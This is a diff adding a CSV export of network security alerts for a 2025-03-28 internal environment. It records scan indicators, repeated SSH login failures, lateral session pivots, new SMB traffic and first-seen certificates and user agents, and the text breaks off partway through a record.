@@ -1,0 +1,920 @@
+SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
+Low,27539,2025-03-28T08:40:55Z,Indicator,Indicator,TCP SYN with ECE/CWR Flags + Empty Payload + IP Fragbits Not Set (Nmap -sS window SYN Stealth Scan Possible),TCP SYN with ECE/CWR Flags + Empty Payload + IP Fragbits Not Set (Nmap -sS window SYN Stealth Scan Possible),Nmap Signatures,1905,,,10.0.4.30,,,Network Traffic,
+Low,27634,2025-03-28T08:34:17Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,f7c7ee99-da3f-4767-91f2-8fa2cac77c6b,
+Low,27677,2025-03-28T08:30:12Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.60.,SSH Authentication Failure,"2896,1881",,,10.0.242.127,10.0.4.60,,240251a9-011d-40c0-8c07-794ea363b824,
+Low,29456,2025-03-28T08:52:33Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via TELNET.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Low,29739,2025-03-28T09:12:13Z,Communication,Configuration,Detected 12 NewSMBTraffic between 2025-03-28T09:02:13.502Z and 2025-03-28T09:12:13.674Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1713, 1697, 48, 1841, 1699, 1746, 1832, 47, 1791, 1914;
+  uuid: e462aa63-790b-4450-9097-793dabe814e5, f2a4ecc1-6f35-47cf-82e6-d322e3c37cd5, 841b44db-229a-4e24-bb4e-ba7bf828eaa5, 110a323e-fd75-4044-aaca-c12472fb3bb2, 79756465-53de-43af-b855-48e9c97c198d, 994cb7e2-7744-49c0-ba9e-36b4b0386a32, af9881ba-d628-41d3-ac47-e1473a6f33e4, b8517727-1053-447f-807e-7c03c3422bfe, 7c9d9661-24ad-43c2-a917-59b317301364, 48d0bc76-90cc-4430-ac9b-d419c12ff116;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_FileInfo, SMB_TreeInfo;
+  protocol: ;
+  versions: , SMB2, SMB1;
+  src_asset_id: 1680, 1905, 1898, 1896, 1936, 154, 1916, 1914;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"1680,1905,1898,1896,1936,154,1916,1914,1713,1697,48,1841,1699,1746,1832,47,1791",,,"10.0.7.29,10.0.4.30,10.0.6.30,10.0.3.30,10.0.5.30,10.0.2.30,10.0.8.30,10.0.7.30","10.0.7.30,10.0.3.11,10.0.5.12,10.0.2.11,10.0.7.12,10.0.5.11,10.0.6.29,10.0.4.11,10.0.2.12,10.0.3.12",,"e462aa63-790b-4450-9097-793dabe814e5, f2a4ecc1-6f35-47cf-82e6-d322e3c37cd5, 841b44db-229a-4e24-bb4e-ba7bf828eaa5, 110a323e-fd75-4044-aaca-c12472fb3bb2, 79756465-53de-43af-b855-48e9c97c198d, 994cb7e2-7744-49c0-ba9e-36b4b0386a32, af9881ba-d628-41d3-ac47-e1473a6f33e4, b8517727-1053-447f-807e-7c03c3422bfe, 7c9d9661-24ad-43c2-a917-59b317301364, 48d0bc76-90cc-4430-ac9b-d419c12ff116",
+Low,29745,2025-03-28T09:07:10Z,Communication,Configuration,Detected 34 NewX509Certificate between 2025-03-28T08:57:13.000Z and 2025-03-28T09:07:10.716Z,"Sample NewX509Certificate values include:
+  server: 151.101.2.137, 172.217.18.4, 142.250.186.35, 216.239.32.36, 10.0.12.29, 172.67.154.249, 142.251.5.84, 151.101.64.223, 142.250.186.131, 35.214.142.18;
+  subject: , CN=CLI1.PLUMETECH.LOCAL, CN=rdap.net;
+  not_before: , 2025-03-26T02:16:08Z, 2025-03-15T06:15:06Z;
+  server_asset_id: 3572, 3560, 1737, 3516, 3563, 3566, 3559, 3570, 3567, 3574;
+  dst__port: ('',);
+  dns: ;
+  uuid: 3ad0140a-22d9-40a1-ad0c-f8f612280c56, 1419e2b3-04b3-432a-b66f-4e262349f6bd, ca47881c-ce8b-4aa8-9373-305046f77782, 42b3d58d-0001-4742-bea8-402282073556, b2d1c4a5-404e-401b-976c-72dbb7b3c55d, edcd93a6-1491-429b-8bba-da1aed473796, 982bfc15-122a-4bcd-9bca-7a2256e4025a, 35256890-971f-4c0a-a50f-d7703ee462ec, 346de012-199d-4584-a666-463e706c7982, 44293005-494f-4311-8450-cffcec656c52;
+  issuer: , C=US, O=Let's Encrypt, CN=E6, CN=CLI1.PLUMETECH.LOCAL;
+  client_asset_id: 1905, 1898, 50, 1910, 1916;
+  src__mac: ;
+  not_after: , 2025-09-25T02:16:08Z, 2025-06-13T06:15:05Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.4.30, 10.0.6.30, 10.0.8.30, 10.0.2.29, 10.0.12.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1905,1898,1916,3572,3563,3566,3570,3567,3574,1737,1910,3560,3516,3559,50",,,"142.251.5.84,142.250.186.131,142.250.184.202,216.58.206.66,142.250.186.65,142.250.186.35,10.0.12.29,151.101.64.223,18.203.219.0,64.176.191.126","10.0.4.30,10.0.6.30,10.0.8.30,10.0.12.30,10.0.2.29",,"3ad0140a-22d9-40a1-ad0c-f8f612280c56, 1419e2b3-04b3-432a-b66f-4e262349f6bd, ca47881c-ce8b-4aa8-9373-305046f77782, 42b3d58d-0001-4742-bea8-402282073556, b2d1c4a5-404e-401b-976c-72dbb7b3c55d, edcd93a6-1491-429b-8bba-da1aed473796, 982bfc15-122a-4bcd-9bca-7a2256e4025a, 35256890-971f-4c0a-a50f-d7703ee462ec, 346de012-199d-4584-a666-463e706c7982, 44293005-494f-4311-8450-cffcec656c52",
+Low,29779,2025-03-28T09:02:22Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,9115c9ef-6d5e-4caa-bc33-9435a7bd7895,
+Low,29780,2025-03-28T09:02:53Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,62694b39-2afa-4433-9614-ecc77b5abbda,
+Low,29784,2025-03-28T09:01:38Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,7ce29e0f-2947-41a8-b7d3-52fa5e4fe47c,
+Low,29786,2025-03-28T09:00:25Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.60.,SSH Authentication Failure,"2896,1881",,,10.0.242.127,10.0.4.60,,321930b3-24ea-4078-b6d9-9b6d7778f632,
+Low,29787,2025-03-28T09:02:21Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,813ecb66-4fe9-4ce2-be71-2b0fd9e645d0,
+Low,29795,2025-03-28T08:59:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.11.,SSH Authentication Failure,"2896,1832",,,10.0.242.127,10.0.4.11,,036342d2-ed49-4b53-974e-906ceff5df3e,
+Low,29803,2025-03-28T09:03:32Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' was seen in the environment for the first time. Originating from asset 1905 (10.0.4.30) to 10.0.4.12 (10.0.4.12).",User Agent First Seen Globally,"1905,1829",,,10.0.4.30,10.0.4.12,,121384db-22a9-48fa-a2fd-4392f957f69e,
+Low,29911,2025-03-28T09:11:21Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1832 (10.0.4.11) connected via RDP to asset 1905 (10.0.4.30) to then pivot to asset 1762 (10.0.4.44) via RDP.,Interactive Session Pivots,"1832,1762",,,10.0.4.11,10.0.4.44,,,
+Low,29912,2025-03-28T09:09:17Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1905 (10.0.4.30) connected via SSH to asset 1832 (10.0.4.11) to then pivot to asset 1905 (10.0.4.30) via RDP.,Interactive Session Pivots,1905,,,10.0.4.30,10.0.4.30,,,
+Low,29922,2025-03-28T09:14:30Z,Asset,Configuration,Detected 9 NewUserAgent between 2025-03-28T09:02:49.240Z and 2025-03-28T09:14:30.449Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: bf1164c7-a247-4eee-a6f0-769db5f03de0, 121384db-22a9-48fa-a2fd-4392f957f69e, 0477b81c-6bbf-42de-af0e-9450333e5411, 45883df0-7fd9-4f35-97ac-17683b81bf29, 0cc1adb4-e31d-4c76-90cd-ac5837e4d03d, 0af97537-a3b6-42e6-bff9-fbfe1d2caaa3, 32e46608-18cc-4163-a6da-9f88f1dc9ded, 0b5a2466-36b6-4c01-8d53-db3320d9c7e4, 08b6d6e9-aaa2-4998-a1ed-5527e8c6acd6;
+  src__mac: ;
+  src_ip: 10.0.9.30, 10.0.4.30, 10.0.6.30, 10.0.11.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1898, 1910, 1933, 1921;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html), Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)), Debian APT-HTTP/1.3 (2.9.29), python-requests/2.32.3, Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0, Python PSRP Client, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36, Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0;
+  src__ip: ;",User Agent First Seen,"1905,1898,1910,1933,1921",,,,,"10.0.4.30,10.0.6.30,10.0.12.30,10.0.11.30,10.0.9.30","bf1164c7-a247-4eee-a6f0-769db5f03de0, 121384db-22a9-48fa-a2fd-4392f957f69e, 0477b81c-6bbf-42de-af0e-9450333e5411, 45883df0-7fd9-4f35-97ac-17683b81bf29, 0cc1adb4-e31d-4c76-90cd-ac5837e4d03d, 0af97537-a3b6-42e6-bff9-fbfe1d2caaa3, 32e46608-18cc-4163-a6da-9f88f1dc9ded, 0b5a2466-36b6-4c01-8d53-db3320d9c7e4, 08b6d6e9-aaa2-4998-a1ed-5527e8c6acd6",
+Low,30005,2025-03-28T09:22:34Z,Communication,Configuration,Detected 7 NewX509Certificate between 2025-03-28T09:11:30.268Z and 2025-03-28T09:22:34.234Z,"Sample NewX509Certificate values include:
+  server: 142.250.185.234, 10.0.5.29, 63.33.151.92, 10.0.9.12, 206.189.156.69, 54.220.122.8, 34.110.138.217;
+  subject: , CN=*.oastify.com, CN=CLI1.PLUMETECH.LOCAL;
+  not_before: , 2025-03-26T02:16:08Z, 2025-03-05T00:00:00Z;
+  server_asset_id: 1704, 3589, 3593, 3592, 1854, 3591, 3590;
+  dst__port: ('',);
+  dns: ;
+  uuid: 18e8b9c1-9bea-42ef-ab82-7a27585c7fbd, d19649b2-bf4d-43fb-a7f0-fd5a400bf6ab, 2105f12d-9a59-4e3d-8952-a0eae7e2fec4, b9e9c9f9-5b0e-4b59-b5fe-640670d82d53, b3e8e423-a986-4885-919e-78e50c4da799, 505829c6-c727-440b-8018-36fe71fc5093, 7198f432-e2c6-4541-8148-3dd2cb51f90b;
+  issuer: , C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA, CN=CLI1.PLUMETECH.LOCAL;
+  client_asset_id: 1905, 1898, 1936, 1921, 151;
+  src__mac: ;
+  not_after: , 2026-01-29T23:59:59Z, 2025-09-25T02:16:08Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.1.30, 10.0.4.30, 10.0.6.30, 10.0.5.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1936,1704,1921,151,3589,3593,3592,1854,3591,3590,1905,1898",,,"10.0.5.29,206.189.156.69,142.250.185.234,54.220.122.8,10.0.9.12,63.33.151.92,34.110.138.217","10.0.5.30,10.0.9.30,10.0.1.30,10.0.4.30,10.0.6.30",,"18e8b9c1-9bea-42ef-ab82-7a27585c7fbd, d19649b2-bf4d-43fb-a7f0-fd5a400bf6ab, 2105f12d-9a59-4e3d-8952-a0eae7e2fec4, b9e9c9f9-5b0e-4b59-b5fe-640670d82d53, b3e8e423-a986-4885-919e-78e50c4da799, 505829c6-c727-440b-8018-36fe71fc5093, 7198f432-e2c6-4541-8148-3dd2cb51f90b",
+Low,30027,2025-03-28T09:23:04Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,806e10a4-fdf5-4827-868a-1a318fd04886,
+Low,30059,2025-03-28T09:13:03Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,d10823ee-9f34-4639-baf9-63675dfca939,
+Low,30062,2025-03-28T09:28:43Z,Communication,Configuration,Detected 13 NewSMBTraffic between 2025-03-28T09:13:46.229Z and 2025-03-28T09:28:43.289Z,"Sample NewSMBTraffic values include:
+  dst__port: ('',);
+  dst_asset_id: 1829, 1725, 45, 1916, 1772, 1746, 1784, 154, 1704, 1921;
+  uuid: 795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42;
+  src__mac: ;
+  dst__mac: ;
+  log_type: SMB_FileInfo, SMB_TreeInfo;
+  protocol: ;
+  versions: , SMB2, UNKNOWN, SMB1;
+  src_asset_id: 1680, 1905, 1898, 50, 1936, 1916, 1914, 1729, 1933, 151;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",New SMB Communication Detection,"1936,1704,1921,1680,1914,1746,151,1905,1898,45,1772,1933,1725,1916,154,50,1729,1829,1784",,,"10.0.5.30,10.0.7.29,10.0.7.30,10.0.1.30,10.0.4.30,10.0.6.30,10.0.11.30,10.0.8.30,10.0.2.29,10.0.9.29","10.0.5.29,10.0.9.30,10.0.6.29,10.0.1.11,10.0.7.11,10.0.11.29,10.0.8.30,10.0.2.30,10.0.4.12,10.0.8.12",,"795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42",
+Low,30157,2025-03-28T09:35:01Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1763 and Asset:1905,New SMB Communication Detection,"1905,1763",,,10.0.4.29,10.0.4.30,,f76221e3-2ca5-439d-8666-577f4e97e19f,
+Low,30158,2025-03-28T09:40:44Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1763 and Asset:1905",New SMB Communication Detection,"1905,1763",,,10.0.4.29,10.0.4.30,,3b416e66-2178-4d80-ac7d-361366abe342,
+Low,30159,2025-03-28T09:36:33Z,Communication,Configuration,New SMB Communication detected,New SMB_TreeInfo (version: ) traffic between Asset:1763 and Asset:1905,New SMB Communication Detection,"1905,1763",,,10.0.4.29,10.0.4.30,,b6384773-dacb-4ba9-8a74-fe5edd3c19b3,
+Low,30165,2025-03-28T09:43:06Z,Asset,Configuration,Detected 12 NewUserAgent between 2025-03-28T09:30:58.397Z and 2025-03-28T09:43:06.759Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 6b9c831e-adf2-46ac-909e-5ab052f3c273, cf757b28-cc23-44aa-b3bd-96566344db13, 6156594a-be64-47ba-9b81-8ce98a89bca2, 00d6c8b0-95a5-4742-a0a9-147219f7e721, 2df16a08-30a4-4332-b70a-529a1ec859a7, 21c27b86-06bd-4d48-8b13-e0f449bdf6d1, 347aff5a-e5b0-4923-a369-45fb95c20407, 002532a5-0337-4a84-9eb0-273c8d350831, 00437653-c8b2-491b-8b1f-72578727cc88, 1b63aab6-58c9-4471-8953-54b8a8deba3b;
+  src__mac: ;
+  src_ip: 10.0.1.29, 10.0.6.29, 10.0.10.30, 10.0.1.30, 10.0.4.30, 10.0.4.29, 10.0.8.29, 10.0.5.30, 10.0.12.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1905, 1910, 1936, 1746, 1919, 1763, 44, 151, 1687;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html), Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0, Microsoft BITS/7.8, Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.2849, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Microsoft-CryptoAPI/10.0, curl/8.12.1, Debian APT-HTTP/1.3 (2.9.33), Python PSRP Client, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0;
+  src__ip: ;",User Agent First Seen,"1910,1905,1763,1687,1919,1936,1746,44,151",,,,,"10.0.12.30,10.0.4.30,10.0.4.29,10.0.8.29,10.0.10.30,10.0.5.30,10.0.6.29,10.0.1.29,10.0.1.30","6b9c831e-adf2-46ac-909e-5ab052f3c273, cf757b28-cc23-44aa-b3bd-96566344db13, 6156594a-be64-47ba-9b81-8ce98a89bca2, 00d6c8b0-95a5-4742-a0a9-147219f7e721, 2df16a08-30a4-4332-b70a-529a1ec859a7, 21c27b86-06bd-4d48-8b13-e0f449bdf6d1, 347aff5a-e5b0-4923-a369-45fb95c20407, 002532a5-0337-4a84-9eb0-273c8d350831, 00437653-c8b2-491b-8b1f-72578727cc88, 1b63aab6-58c9-4471-8953-54b8a8deba3b",
+Low,30166,2025-03-28T09:38:52Z,Communication,Configuration,Detected 13 NewX509Certificate between 2025-03-28T09:30:44.778Z and 2025-03-28T09:38:52.445Z,"Sample NewX509Certificate values include:
+  server: 142.250.186.67, 40.126.31.71, 162.159.134.233, 162.159.134.232, 162.159.138.232, 151.101.194.137, 10.0.9.11, 172.217.18.3, 162.159.129.233, 142.250.186.138;
+  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
+  server_asset_id: 1732, 364, 3600, 3606, 3603, 3607, 3705, 3596, 3598, 3601;
+  dst__port: ('',);
+  dns: ;
+  uuid: ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1905, 1725, 50, 1916, 1921;
+  src__mac: ;
+  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.30, 10.0.11.29, 10.0.4.30, 10.0.8.30, 10.0.2.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1905,1916,1732,1725,3603,364,3600,3606,3607,3705,3596,3598,3601,50,1921",,,"10.0.9.11,142.250.186.138,20.190.159.130,18.198.149.116,151.101.130.137,162.159.129.233,162.159.138.232,172.217.18.3,142.250.186.67,40.126.31.71","10.0.4.30,10.0.8.30,10.0.11.29,10.0.2.29,10.0.9.30",,"ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3",
+Low,30315,2025-03-28T09:43:12Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,a0dd1b36-559c-42a0-a416-39c4aeacc334,
+Low,30319,2025-03-28T09:41:33Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,c9a269aa-f6a1-486e-8a15-1b8a7bf68dd0,
+Low,30334,2025-03-28T09:32:53Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,e28ee8d6-3b33-4b96-ac9f-add88e7186b9,
+Low,30335,2025-03-28T09:36:11Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,c507509b-b4df-465a-9099-7d496e2ed5d4,
+Low,30337,2025-03-28T09:31:34Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,060361be-4060-4a03-8865-57151b9fedd1,
+Low,30345,2025-03-28T08:39:37Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,e7815a5b-204d-4062-8c3e-473e875f6263,
+Low,30346,2025-03-28T08:38:26Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,301f5e3b-a141-40ea-b4ad-42bf584c0a92,
+Low,30347,2025-03-28T08:37:59Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,ae667b7e-c328-48c5-bdf3-1122f36df30e,
+Low,30351,2025-03-28T08:34:17Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,efa69938-aebd-4248-a984-c2636b1549fd,
+Medium,30405,2025-03-28T09:11:19Z,Communication,Threat Behavior,Multiple Suricata Alerts,"Asset 1905 involved in 6 unique Suricata alerts: ['2035466', '2035463', '9100435', '2035465', '20240042', '2035464']; ['ET INFO Observed Discord Domain in DNS Lookup (discordapp .com)', 'HTTP GET to IP', 'ET INFO Observed Discord Domain in DNS Lookup (discord .com)', 'ET INFO Observed Discord Domain (discord .com in TLS SNI)', 'ET INFO Observed Discord Domain (discordapp .com in TLS SNI)', 'SMB - NT Status: STATUS_BAD_NETWORK_NAME']. IPs: 10.0.4.30 10.0.4.11.",Multiple Suricata Alerts,"1832,1905",,,10.0.4.11,10.0.4.30,,,
+Low,32277,2025-03-28T09:53:06Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,0b49fdbf-bc73-4b8b-9e01-a9769ee1353c,
+Low,32283,2025-03-28T09:50:27Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,2b3740d0-d178-4511-8274-82132eb91fc3,
+Low,32288,2025-03-28T09:45Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,d6592f74-0125-419a-9da3-b512f18237df,
+Low,32291,2025-03-28T09:41:27Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,9f322b6b-0485-4c68-a3f6-ae894929a867,
+Low,32300,2025-03-28T08:56:02Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,4b860d17-61bf-4dd8-b103-238414218223,
+Low,32301,2025-03-28T08:53:19Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,0e0f33a2-6189-4100-9cda-154b8dae3cbc,
+Low,32305,2025-03-28T08:56:51Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,dcd772bb-eccc-4b88-8f87-7bfdcb9ac1ee,
+Low,32318,2025-03-28T09:51:59Z,Communication,Configuration,Detected 159 NewX509Certificate between 2025-03-28T09:38:52.262Z and 2025-03-28T09:51:59.546Z,"Sample NewX509Certificate values include:
+  server: 169.150.247.36, 35.214.136.108, 45.137.176.88, 142.250.186.34, 104.18.27.193, 10.0.6.11, 52.210.124.59, 54.246.115.73, 178.250.1.11, 20.189.173.5;
+  subject: , C=NO, L=Oslo, O=Opera Norway AS, CN=*.adx.opera.com, C=US, ST=California, L=San Francisco, O=Mozilla Corporation, CN=incoming.telemetry.mozilla.org, CN=DC1.PLUMETECH.LOCAL, CN=FS1.PLUMETECH.LOCAL, C=US, ST=California, L=Los Angeles, O=Magnite, Inc., CN=*.rubiconproject.com, CN=*.adnxs-simple.com, CN=*.adnxs.com, CN=*.tremorhub.com, CN=*.yellowblue.io;
+  not_before: , 2024-02-29T00:00:00Z, 2025-02-21T00:00:00Z, 2024-06-23T10:17:34Z, 2025-03-26T02:23:20Z, 2024-05-23T00:00:00Z, 2025-03-04T00:00:00Z, 2024-04-23T12:44:34Z, 2024-05-31T00:00:00Z, 2024-09-29T00:00:00Z;
+  server_asset_id: 3680, 3676, 3733, 3702, 3609, 3727, 3707, 1754, 3665, 3750;
+  dst__port: ('',);
+  dns: ;
+  uuid: a1a14540-7106-4701-8338-8b34b48ab06d, 59316db6-f1b0-42f0-acc5-1303a9bf5b47, 016a9776-5e47-438e-882d-73739d046542, d198db01-e208-4b1c-848a-40dbd176eb48, a8161dc4-f92b-459a-ae6e-cc70cf67f8f0, ccf163db-5977-4918-a306-a9b2812d2b26, 7bf004cd-939b-430a-ae69-93ea2d575e68, e596c3e3-9531-4546-bbca-d99be4f6afcc, 4e9b80bd-1d20-499a-a7ce-97f7d6efb99a, 19b37432-32c8-47d1-a3a4-acbcfe7abe38;
+  issuer: , C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1, C=US, O=Amazon, CN=Amazon RSA 2048 M03, CN=FS1.PLUMETECH.LOCAL, C=BE, O=GlobalSign nv-sa, CN=GlobalSign GCC R3 DV TLS CA 2020, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, C=US, O=Amazon, CN=Amazon RSA 2048 M02, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 08, C=US, O=DigiCert Inc, OU=www.digicert.com, CN=GeoTrust ECC CA 2018, C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA;
